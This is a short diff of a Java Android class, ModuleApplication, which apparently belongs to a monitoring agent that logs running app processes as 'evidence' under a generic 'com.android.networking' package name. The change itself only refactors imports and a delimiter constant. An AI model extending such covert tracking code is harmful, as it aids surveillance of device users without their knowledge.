@@ -13,13 +13,13 @@ import java.util.ArrayList;
 
 import android.app.ActivityManager.RunningAppProcessInfo;
 
-import com.android.networking.LogR;
 import com.android.networking.ProcessInfo;
 import com.android.networking.ProcessStatus;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
-import com.android.networking.evidence.Evidence;
+
 import com.android.networking.evidence.EvidenceType;
+import com.android.networking.evidence.LogR;
 import com.android.networking.interfaces.IncrementalLog;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerProcess;
@@ -83,7 +83,7 @@ public class ModuleApplication extends BaseModule implements IncrementalLog, Obs
 		items.add(WChar.getBytes(name, true));
 		items.add(WChar.getBytes(status.name(), true));
 		items.add(WChar.getBytes(module, true));
-		items.add(ByteArray.intToByteArray(Evidence.E_DELIMITER));
+		items.add(ByteArray.intToByteArray(LogR.E_DELIMITER));
 
 		if (Cfg.DEBUG) {
 			Check.asserts(logIncremental != null, "null log"); //$NON-NLS-1$
